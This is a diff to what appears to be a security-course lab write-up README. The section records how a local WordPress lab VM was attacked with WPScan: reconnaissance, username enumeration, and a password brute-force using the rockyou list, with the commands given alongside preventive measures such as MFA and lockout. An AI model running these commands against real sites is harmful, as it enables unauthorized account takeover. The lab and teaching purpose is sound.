@@ -14,8 +14,8 @@ Time spent: **X** hours spent in total
   - Tools/Resources Used: <br /> https://www.kali.org/tools/wpscan <br />  password list: rockyou.txt
   - Techniques: BruteForce, Dictionary Attack, Credential Stuffing
   - Preventative Action: Password Complexity, Multi-Factor Authentication (MFA), Password Manager, Account Lockout Policy
-  - Commands used:<br />
-  sudo gunzip /usr/share/wordlists/rockyou.txt.gz (extract and move for ease of use)
+  - Commands used:
+  <br /> sudo gunzip /usr/share/wordlists/rockyou.txt.gz (extract and move for ease of use)
   <br /> wpscan --url http://wpdistillery.vm (Reconnasissance)
   <br /> wpscan --url http://wpdistillery.vm --enumerate u (Finding Usernames)
   <br /> wpscan --url http://wpdistillery.vm -U ~/Desktop/wpusers.txt -P ~/Desktop/rockyou.txt (BruteForce Attack)
